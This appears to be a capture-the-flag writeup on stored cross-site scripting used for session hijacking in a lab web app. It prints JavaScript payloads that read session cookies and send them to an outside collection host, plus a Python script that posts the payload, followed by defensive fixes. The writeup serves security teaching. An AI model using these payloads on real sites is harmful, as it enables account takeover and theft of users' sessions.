# Writeup – Cross-Site Scripting (XSS) Session Hijacking

This challenge involved implementing **Cross-Site Scripting (XSS)** attacks to perform session hijacking against a vulnerable web application. The goal was to inject malicious JavaScript to steal victim session cookies and demonstrate the impact of inadequate input validation.

---

## 🔍 Challenge Overview

The challenge provided a vulnerable web application that allowed users to post messages without proper input sanitization. The objective was to craft XSS payloads that could steal authenticated users' session cookies when they viewed the malicious posts.

### 🎯 Key Vulnerabilities:
- **No input sanitization** in message posting functionality
- **Reflected XSS** through user-generated content
- **Session cookies accessible** via JavaScript (missing HttpOnly flag)
- **Cross-origin requests allowed** for data exfiltration

---

## 🛠️ My Exploitation Approach

### 1. **Vulnerability Analysis**
- Identified that the `/post.php` endpoint accepts unsanitized user input
- Discovered that posted messages are displayed without HTML encoding
- Confirmed that session cookies are accessible via `document.cookie`
- Located external token collection service for session exfiltration

### 2. **XSS Payload Development**
Crafted JavaScript payloads to extract and exfiltrate session cookies:

#### Basic XSS Payload (exploit3.py):
```javascript
<script>
var img = new Image();
var cookie = document.cookie.split("=")[1];
img.src = "https://token.seclab.space/set.php?sid=1006103681&token="+cookie;
</script>
```

#### Advanced Session Extraction (exploit.py):
```javascript
<script>
  var img = new Image();
  var sessionID = document.cookie
    .split("; ")
    .find((cookie) => cookie.startsWith("PHPSESSID"))
    ?.split("=")[1];
  img.src = `https://token.seclab.space/set.php?sid=1008882933&token=${sessionID}`;
  console.log("Injected session ID:", sessionID);
</script>
```

### 3. **Attack Automation**
Developed Python scripts to automate the attack process:

```python
# Mallory's credentials
mallory = {
    'email': 'mallory@example.com',
    'password': 'pass4mallory'
}

# Reset the application
requests.get(BASE + '/reset.php')

# Start a session as Mallory
session = requests.Session()
response = session.post(BASE + '/signin.php', data=mallory)

# Post the malicious XSS payload
post_payload = {'msg': payload}
post_response = session.post(BASE + '/post.php', data=post_payload)
```

### 4. **Session Token Collection**
- Used external token collection service at `token.seclab.space`
- Implemented unique session IDs for tracking different attack attempts
- Created image-based requests to bypass CORS restrictions

---

## 🔬 Technical Attack Flow

### Step-by-Step Exploitation
1. **Attacker Authentication**: Login as Mallory to post malicious content
2. **XSS Payload Injection**: Post JavaScript code disguised as normal content
3. **Victim Interaction**: Alice views the malicious post during her session
4. **JavaScript Execution**: Browser executes the injected script
5. **Cookie Extraction**: Script accesses `document.cookie` to retrieve session ID
6. **Data Exfiltration**: Session cookie sent to attacker-controlled server
7. **Session Hijacking**: Attacker can impersonate the victim using stolen session

### Network Communication Flow
```
Attacker → Web App (POST malicious script)
Victim → Web App (GET page with XSS)
Victim's Browser → Attacker Server (GET with stolen session)
Attacker → Web App (Use stolen session for impersonation)
```

---

## 🧪 Multiple Exploit Variations

### Exploit Iteration Process
The challenge included multiple exploit attempts showing the evolution of the attack:

1. **exploit3.py** - Simple cookie extraction using string splitting
2. **exploit_2.py** - Enhanced payload with better error handling  
3. **exploit.py** - Most sophisticated version with precise session ID extraction

### Payload Refinement
```javascript
// Simple version
var cookie = document.cookie.split("=")[1];

// Advanced version  
var sessionID = document.cookie
  .split("; ")
  .find((cookie) => cookie.startsWith("PHPSESSID"))
  ?.split("=")[1];
```

---

## 🏆 Attack Success and Discovery

The XSS attack successfully demonstrated:
- ✅ **JavaScript injection** into web application content
- ✅ **Session cookie extraction** from authenticated users
- ✅ **Cross-origin data exfiltration** to attacker servers
- ✅ **Automated attack execution** using Python scripts

### 🔍 Discovery: HttpOnly Protection

During the challenge, I discovered that the target application eventually implemented **HttpOnly cookie protection**, which prevented JavaScript access to session cookies. This discovery led to understanding advanced security measures:

**Flag Retrieved: `HttpOnly`** - indicating the security mechanism that blocks XSS-based cookie theft.

---

## 🛡️ Defense Mechanisms

### XSS Prevention Strategies
1. **Input Sanitization**: HTML encode all user-generated content
2. **Content Security Policy (CSP)**: Restrict script execution sources
3. **HttpOnly Cookies**: Prevent JavaScript access to session cookies
4. **Output Encoding**: Context-appropriate encoding for different output contexts
5. **Input Validation**: Whitelist allowed characters and patterns

### Recommended Fixes
```php
// Input sanitization
$message = htmlspecialchars($_POST['msg'], ENT_QUOTES, 'UTF-8');

// HttpOnly session cookies
session_set_cookie_params([
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

## 📚 Key Learnings

1. **XSS Attack Vectors**: Understanding different types of cross-site scripting
2. **Session Management**: Critical importance of secure cookie handling
3. **JavaScript Security**: Browser security model and DOM access
4. **Attack Automation**: Python scripting for security testing
5. **Defense Evolution**: How security measures evolve to counter attacks
6. **Real-world Impact**: Practical consequences of XSS vulnerabilities

---

## 🎯 Educational Value

This challenge demonstrated:
- **Practical XSS exploitation** techniques in real applications
- **Session hijacking methodologies** and their impact
- **The evolution of web security** defenses like HttpOnly
- **Attack automation** for security research and testing
- **Defense implementation** against script injection attacks

---

## 📁 Files Overview

- [`exploit.py`](./exploit.py) - Advanced XSS attack with precise session extraction
- [`exploit_2.py`](./exploit_2.py) - Intermediate attack version with improvements
- [`exploit3.py`](./exploit3.py) - Basic XSS payload for cookie theft
- [`docker-compose.yml`](./docker-compose.yml) - Container environment setup
- [`challenge.md`](./challenge.md) - Challenge description and objectives
- [`writeup.md`](./writeup.md) - This technical analysis

This challenge showcased practical web application security skills and demonstrated the critical importance of implementing proper input validation and secure session management in modern web applications.